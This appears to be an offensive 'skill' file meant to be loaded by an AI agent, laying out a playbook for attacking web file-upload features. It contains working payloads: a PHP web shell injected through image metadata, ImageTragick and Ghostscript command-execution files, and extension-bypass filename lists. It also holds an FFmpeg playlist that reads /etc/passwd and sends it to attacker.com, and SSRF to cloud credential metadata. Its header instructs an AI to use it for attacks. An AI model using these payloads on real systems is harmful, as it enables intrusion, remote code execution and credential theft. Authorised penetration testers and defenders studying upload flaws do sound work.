---
name: upload-insecure-files
description: >-
  Insecure file upload playbook. Use when testing upload validation, storage paths, processing pipelines, preview behavior, overwrite risks, and upload-to-RCE chains.
---

# SKILL: Upload Insecure Files — Validation Bypass, Storage Abuse, and Processing Chains

> **AI LOAD INSTRUCTION**: Expert file upload attack playbook. Use when the target accepts files, imports, avatars, media, documents, or archives and you need the full workflow: validation bypass, storage path abuse, post-upload access, parser exploitation, multi-tenant overwrite, and chaining into XSS, XXE, CMDi, traversal, or business logic impact. For web server parsing vulnerabilities, PUT method exploitation, and specific CVEs (WebLogic, Flink, Tomcat), load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- IIS parsing vulnerabilities — `x.asp/` directory parsing, `;` semicolon truncation (`shell.asp;.jpg`)
- Nginx parsing misconfiguration — `avatar.jpg/.php` with `cgi.fix_pathinfo=1`
- Apache parsing — multiple extensions, `AddHandler`, CVE-2017-15715 `\n` (0x0A) bypass
- PUT method exploitation — IIS WebDAV PUT+COPY, Tomcat CVE-2017-12615 `readonly` + `.jsp/` bypass
- WebLogic CVE-2018-2894 arbitrary file upload via Web Service Test Page
- Apache Flink CVE-2020-17518 file upload with path traversal
- Upload + parsing vulnerability chain — EXIF PHP code + Nginx `/.php` path info
- Full extension bypass reference table (PHP/ASP/JSP alternatives, case variations, null bytes)

Use this file as the deep upload workflow reference. Also load:

- [path traversal lfi](../path-traversal-lfi/SKILL.md) when filename, extraction path, or include path becomes file-system control
- [xss cross site scripting](../xss-cross-site-scripting/SKILL.md) when uploads are rendered in browser contexts
- [xxe xml external entity](../xxe-xml-external-entity/SKILL.md) when SVG, OOXML, or XML imports are accepted
- [cmdi command injection](../cmdi-command-injection/SKILL.md) when a processor, converter, or media pipeline executes system tools
- [business logic vulnerabilities](../business-logic-vulnerabilities/SKILL.md) when quotas, overwrite rules, approvals, or storage paths create logic bugs
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the server is **Apache Tomcat** and the WAF blocks `.jsp` in `filename*` — Tomcat's `RFC2231Utility` narrows each char to byte, so `1.陪sp` (U+966A low byte = `j`) writes `1.jsp` to disk while the WAF sees no `.jsp` literal

---

## 1. CORE MODEL

Every upload feature should be tested as four separate trust boundaries:

1. **Accept**: what validation happens before the file is stored?
2. **Store**: where is the file written and under what name and permissions?
3. **Process**: what background tools, converters, scanners, parsers, or extractors touch it?
4. **Serve**: how is it later downloaded, rendered, transformed, or shared?

Many targets validate only one stage. The bug usually appears in a different stage than the one where the file was uploaded.

---

## 2. RECON QUESTIONS FIRST

Before payload selection, answer these:

- Which extensions are allowed, denied, or normalized?
- Does the backend trust extension, MIME type, magic bytes, or all three?
- Is the file renamed, transcoded, unzipped, scanned, or re-hosted?
- Is retrieval direct, proxied, signed, or served from a CDN?
- Can one user predict or overwrite another user's file path?
- Do filenames, metadata, or previews reflect back into HTML, logs, admin consoles, or PDFs?

---

## 3. VALIDATION BYPASS MATRIX

| Validation Style | What to Test |
|---|---|
| extension blacklist | double extension, case toggles, trailing dot, alternate separators |
| content-type only | mismatched multipart `Content-Type`, browser vs proxy rewrite |
| magic-byte only | polyglot files or valid header plus dangerous tail content |
| server-side rename | whether dangerous content survives rename and later rendering |
| image-only policy | SVG, malformed image plus metadata, parser differential |
| archive or import only | zip contents, nested path names, XML members, decompression behavior |

Representative bypass families:

```text
shell.php.jpg
avatar.jpg.php
file.asp;.jpg
file.php%00.jpg
file.svg
archive.zip
```

This small sample set already covers the main use cases of the former standalone upload payload helper, so no extra entry is needed for first-pass selection.

Do not stop at upload success. Successful upload without dangerous retrieval or processing is not enough.

---

## 4. STORAGE AND RETRIEVAL ABUSE

### Predictable or controllable paths

Look for patterns like:

```text
/uploads/USER_ID/avatar.png
/files/org-slug/report.pdf
/cdn/tmp/<uuid>/<filename>
```

Test for:

- cross-tenant read by guessing IDs, slugs, or UUID patterns
- overwrite by reusing another user's filename
- path normalization bugs in filename or archive members
- private file exposed through direct object URL despite UI-level access control

### Filename-based injection surfaces

A safe file can still be dangerous if the **filename** is reflected into:

- gallery HTML
- admin moderation panels
- PDF/CSV export jobs
- logs, audit views, or email notifications

If filename is reflected, treat it like stored input, not like passive metadata.

---

## 5. PROCESSING-CHAIN ATTACKS

The highest-value upload bugs often live in asynchronous processors.

### Common processor classes

| Processor | Risk |
|---|---|
| image resizing or thumbnailing | parser differential, ImageMagick or library bugs, metadata reflection |
| video or audio transcoding | FFmpeg-style parsing and protocol abuse |
| archive extraction | zip slip, overwrite, decompression bombs |
| document import | CSV formula injection, office XML parsing, macro-adjacent workflows |
| XML or SVG parsing | XXE, SSRF, local file disclosure |
| HTML to PDF or preview rendering | SSRF, script execution, local file references |
| AV or DLP scanning | unzip depth, hidden nested content, race conditions |

### What to prove

1. The file is touched by a processor.
2. The processor behaves differently from the upload validator.
3. That difference creates impact: read, execute, overwrite, SSRF, or stored client-side execution.

---

## 6. HIGH-VALUE EXPLOITATION PATHS

### Browser execution

- SVG served as active content
- HTML or text uploads rendered inline
- EXIF or filename reflected into an HTML page

### XML and document parsing

- SVG XXE for file read or SSRF
- OOXML import for XML entity or parser abuse
- CSV import for formula execution in analyst workflows

### Server-side execution or file-system impact

- image or document converter invoking shell tools
- zip slip writing outside intended directory
- upload-to-LFI chain where uploaded content later becomes includable

### Access-control and sharing bugs

- private upload accessible via predictable URL
- moderation or quarantine path still publicly reachable
- one user replacing another user's public asset

---

## 7. AUTHORIZATION AND BUSINESS LOGIC CHECKS

Upload features frequently hide non-parser bugs:

- upload quota enforced in UI but not API
- plan restrictions checked on upload page but not on import endpoint
- file ownership checked on list view but not on direct download or replace endpoint
- approval workflow bypassed by calling the final storage endpoint directly
- delete or replace action missing object-level authorization

When the upload path includes account, project, or organization identifiers, always run an A/B authorization test.

---

## 8. TEST SEQUENCE

1. Upload one benign marker file and map rename, path, and retrieval behavior.
2. Try one validation-bypass sample and one active-content sample.
3. Check whether retrieval is attachment, inline render, transformed preview, or background processing.
4. If processing exists, pivot by processor family: XSS, XXE, CMDi, zip slip, or SSRF.
5. Run tenant-boundary and overwrite tests on file IDs, replace endpoints, and public URLs.

---

## 9. CHAINING MAP

| Observation | Pivot |
|---|---|
| SVG or XML accepted | [xxe xml external entity](../xxe-xml-external-entity/SKILL.md) |
| filename or metadata reflected | [xss cross site scripting](../xss-cross-site-scripting/SKILL.md) |
| converter or processor shells out | [cmdi command injection](../cmdi-command-injection/SKILL.md) |
| extraction path looks controllable | [path traversal lfi](../path-traversal-lfi/SKILL.md) |
| overwrite, quota, approval, or tenant bug | [business logic vulnerabilities](../business-logic-vulnerabilities/SKILL.md) |

---

## 10. OPERATOR CHECKLIST

```text
[] Confirm accept/store/process/serve stages separately
[] Test one extension bypass and one content-based payload
[] Check inline render vs forced download
[] Inspect filenames, metadata, and preview surfaces for reflection
[] Probe processing chain: image, archive, XML, document, PDF
[] Run A/B authorization on read, replace, delete, and share actions
[] Map predictable paths and public/private URL boundaries
```

---

## 11. UPLOAD SUCCESS RATE MODEL & ADVANCED METHODOLOGY

### Success Rate Formula

```
P(RCE via Upload) = P(bypass_detection) × P(obtain_path) × P(execute_via_webserver)
```

Many testers focus only on bypassing file type checks, but forget:

- **Path discovery**: Without knowing the upload path, even a successful bypass is useless
- **Server parsing**: Even with a `.php` file uploaded, if the web server doesn't parse it as PHP, no RCE

### Rich Text Editor Path Matrix

| Editor | Common Upload Path | Version Indicator |
|---|---|---|
| FCKeditor | `/fckeditor/editor/filemanager/connectors/` | `/fckeditor/_whatsnew.html` |
| CKEditor | `/ckeditor/` | `/ckeditor/CHANGES.md` |
| eWebEditor | `/ewebeditor/` | Admin: `/ewebeditor/admin_login.asp` |
| KindEditor | `/kindeditor/attached/` | `/kindeditor/kindeditor.js` |
| UEditor | `/ueditor/net/` or `/ueditor/php/` | `/ueditor/ueditor.config.js` |

### Validation Defect Taxonomy (5 Dimensions)

| Dimension | Flaw Examples |
|---|---|
| **Location** | Client-side only, inconsistent front/back |
| **Method** | Extension blacklist (incomplete), MIME check only, magic bytes only |
| **Logic order** | Renames AFTER execution check, validates BEFORE full upload |
| **Scope** | Checks filename but not file content, checks first bytes only |
| **Execution context** | Upload succeeds but different vhost/handler processes the file |

### Response Manipulation Bypass

```
# If server returns allowedTypes in response for client-side validation:
# Intercept response → modify allowedTypes to include .php → upload .php
# The server never actually validates — it trusts client filtering
```

### IIS Semicolon Parsing

```
# IIS treats semicolon as parameter delimiter in filenames:
shell.asp;.jpg    → IIS executes as ASP
# NTFS Alternate Data Stream:
shell.asp::$DATA  → Bypasses extension check, IIS may execute
```

### Apache Multi-Extension

```
# Apache parses right-to-left for handler:
shell.php.jpg     → May execute as PHP if AddHandler php applies
# Newline in filename (CVE-2017-15715):
shell.php\x0a     → Bypasses regex but Apache still executes as PHP
```

### Nginx cgi.fix_pathinfo

```
# With cgi.fix_pathinfo=1 (PHP-FPM):
/uploads/image.jpg/anything.php → PHP processes image.jpg as PHP!
# Upload legitimate-looking JPG with PHP code embedded
```

---

## 12. POLYGLOT FILE TECHNIQUES

Files that are simultaneously valid in two or more formats, bypassing format-specific validation while delivering a dangerous payload.

### GIFAR (GIF + JAR)

```text
# GIF header + JAR appended
# GIF89a header (6 bytes) + padding + JAR archive (ZIP format)
# Browser: valid GIF image
# Java: valid JAR archive → applet execution (legacy)

cat header.gif payload.jar > gifar.gif
# Passes image validation, executes as Java applet if loaded via <applet>
```

### PNG + PHP polyglot

```bash
# Inject PHP code into PNG IDAT chunk or tEXt metadata
# The PNG renders as valid image; when included via LFI, PHP code executes

# Method 1: PHP in tEXt chunk
python3 -c "
import struct
png_header = b'\x89PNG\r\n\x1a\n'
# ... minimal IHDR + IDAT + tEXt chunk containing PHP
"

# Method 2: Use exiftool to inject into comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png
# Upload image.png → LFI include → PHP executes from metadata
```

### JPEG + JS polyglot

```bash
# JPEG comment marker (0xFFFE) can contain JavaScript
# If served with Content-Type: text/html (or MIME sniffing active):
exiftool -Comment='<script>alert(document.domain)</script>' photo.jpg

# Combined with content-type confusion → XSS via image upload
```

### PDF + JS polyglot

```text
# PDF header followed by JS:
%PDF-1.0
1 0 obj<</Pages 2 0 R>>endobj
2 0 obj<</Kids[3 0 R]/Count 1>>endobj
3 0 obj<</MediaBox[0 0 3 3]>>endobj
trailer<</Root 1 0 R>>
*/=alert('XSS')/*
```

---

## 13. IMAGEMAGICK EXPLOITATION CHAIN

### CVE-2016-3714 (ImageTragick) — RCE via Delegates

ImageMagick uses "delegates" (external programs) for certain format conversions. Specially crafted files trigger shell command execution:

### MVG (Magick Vector Graphics)

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

### SVG delegate abuse

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px">
  <image xlink:href="https://example.com/image.jpg&quot;|id > /tmp/pwned&quot;" x="0" y="0"/>
</svg>
```

### Ghostscript exploitation

ImageMagick delegates to Ghostscript for PDF/PS/EPS processing. Ghostscript has had multiple sandbox escapes:

```postscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id > /tmp/pwned) currentdevice putdeviceprops
```

Upload as `.eps`, `.ps`, or `.pdf` → ImageMagick invokes Ghostscript → RCE.

### Mitigation check

```text
□ Is ImageMagick policy.xml restricting dangerous coders?
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
□ Is Ghostscript updated and sandboxed (-dSAFER)?
```

---

## 14. FFMPEG SSRF & LOCAL FILE READ

### HLS playlist file read

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST
```

Upload as `.m3u8` or `.ts` → FFmpeg processes it → file content concatenated with header and sent to attacker server or embedded in output video.

### SSRF via HLS

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```

FFmpeg fetches the URL server-side → SSRF to cloud metadata endpoint.

### Concat protocol for local file inclusion

```m3u8
#EXTM3U
#EXTINF:1,
concat:file:///etc/passwd|subfile,,start,0,end,0,,:
#EXT-X-ENDLIST
```

### AVI + subtitle SSRF

Create AVI with subtitle track referencing a URL:
```bash
ffmpeg -i input.avi -vf "subtitles=http://169.254.169.254/latest/meta-data/" output.avi
```

---

## 15. CLOUD STORAGE UPLOAD CONSIDERATIONS

### S3 Presigned URL Abuse

```text
# Presigned URL generated for specific key and content-type:
PUT https://bucket.s3.amazonaws.com/uploads/avatar.jpg
  ?X-Amz-Algorithm=AWS4-HMAC-SHA256&...&X-Amz-SignedHeaders=host;content-type

# Abuse: if content-type is NOT in SignedHeaders:
# Change Content-Type from image/jpeg to text/html → upload XSS payload
# The signature remains valid because content-type wasn't signed

# If path is not signed (only prefix):
# Change key from uploads/avatar.jpg to uploads/../admin/config.json
```

**Audit checklist**:
```text
□ Which headers are included in SignedHeaders? (must include content-type)
□ Is the full key path signed or just a prefix?
□ Is the upload bucket the same as the serving bucket? (write to CDN-served bucket → stored XSS)
□ Is the ACL signed? (prevent setting public-read on sensitive uploads)
```

### Azure Blob Storage SAS Token

```text
# SAS token scope issues:
# Container-level SAS with write permission → write to ANY blob in container
# Service-level SAS → may allow listing/reading other blobs
# Check: sr= (signed resource), sp= (signed permissions), se= (expiry)
```

### GCS Signed URL

```text
# Similar to S3 — check if Content-Type is included in signature
# Resumable upload URLs may have broader permissions than intended
# V4 signed URLs: verify X-Goog-SignedHeaders includes content-type
```

---

## 16. CONTENT-TYPE VALIDATION BYPASS

### Double extensions

```text
shell.php.jpg          → Apache with AddHandler may execute as PHP
shell.asp;.jpg         → IIS semicolon truncation
shell.php%00.jpg       → Null byte truncation (PHP < 5.3.4, old Java)
shell.php.xxxxx        → Unknown extension → Apache falls back to previous handler
```

### MIME sniffing exploitation

When server sends no `Content-Type` or `X-Content-Type-Options: nosniff` is missing:

```text
# Upload file with HTML/JS content but image extension
# Browser MIME-sniffs content → executes as HTML
# Works for stored XSS even when extension validation passes
```

### Content-Type header vs extension mismatch

```text
# Upload request:
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

# File content: <?php system($_GET['cmd']); ?>

# Server trusts Content-Type header (image/jpeg) → passes validation
# But stores with .php extension based on other logic → executes as PHP
```

### Case variation

```text
shell.PhP    shell.pHP    shell.Php
shell.aSp    shell.jSp    shell.ASPX
```

### Trailing characters

```text
shell.php.      → trailing dot (Windows strips it)
shell.php::$DATA → NTFS alternate data stream (IIS)
shell.php\x20   → trailing space
shell.php%20    → URL-encoded space
```